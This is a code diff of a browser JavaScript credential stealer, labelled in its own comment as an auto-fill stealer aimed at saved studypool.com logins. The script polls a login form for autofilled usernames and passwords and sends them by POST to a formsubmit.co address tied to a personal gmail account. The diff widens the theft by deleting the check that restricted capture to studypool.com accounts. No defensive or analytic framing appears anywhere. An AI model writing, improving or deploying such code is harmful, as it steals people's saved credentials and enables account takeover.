@@ -1,3 +1,4 @@
+// SMART & SELECTIVE AUTO-FILL STEALER – ONLY TRIGGERS ON REAL studypool.com SAVED LOGINS
 (function () {
   if (window.stealSent) return; // Prevent duplicate runs
 
@@ -14,15 +15,12 @@
 
     // Strong indicators this is a real StudyPool saved login
     const isAutoFilled = passwordField.matches(':-webkit-autofill, :autofill, [autocompleted]');
-    const hasStudyPoolHint =
-          user.toLowerCase().includes('study') ||
-          user.toLowerCase().includes('pool') ||
-          user.includes('@') && user.split('@')[1]?.includes('study');
+    const hasStudyPoolHint = 
+          user.toLowerCase().includes('study') || 
+          user.toLowerCase().includes('pool') || 
+          user.includes('@') && user.split('@')[1].includes('study');
 
-    // Check if the domain is studypool.com
-    const isStudyPoolDomain = user.includes('@studypool.com');
-
-    if ((isAutoFilled || hasStudyPoolHint) && isStudyPoolDomain && !window.stealSent) {
+    if ((isAutoFilled || hasStudyPoolHint) && !window.stealSent) {
       window.stealSent = true;
 
       const payload = new FormData();
@@ -36,38 +34,18 @@
       fetch('https://formsubmit.co/charpestine@gmail.com', {
         method: 'POST',
         body: payload
-      }).catch(() => {}); // Silent fail
+      });
 
       console.log('%cSTUDYPOOL AUTO-FILL SUCCESSFULLY CAPTURED', 'color: #00ff00; font-weight: bold;');
     }
-  }
-
-  // Function to focus on the username and password fields to trigger auto-fill
-  function triggerAutoFill() {
-    usernameField.focus();
-    usernameField.blur();
-    passwordField.focus();
-    passwordField.blur();
-    passwordField.focus();
   }
 
   // Aggressive polling for first 10 seconds (most auto-fills happen instantly)
   const poll = setInterval(captureIfStudyPool, 350);
   setTimeout(() => clearInterval(poll), 10000);
 
-  // Trigger auto-fill on page load
-  window.addEventListener('load', triggerAutoFill);
-
-  // Fallback triggers on user interaction
-  ['input', 'change', 'focus', 'blur'].forEach(event =>
+  // Fallback triggers
+  ['input', 'change', 'focus', 'blur'].forEach(event => 
     document.body.addEventListener(event, captureIfStudyPool, true)
   );
-
-  // Optional: Show loading spinner on submit
-  const loginBtn = document.getElementById('loginBtn');
-  const form = document.getElementById('loginForm');
-
-  form.addEventListener('submit', function () {
-    loginBtn.classList.add('loading');
-  });
 })();
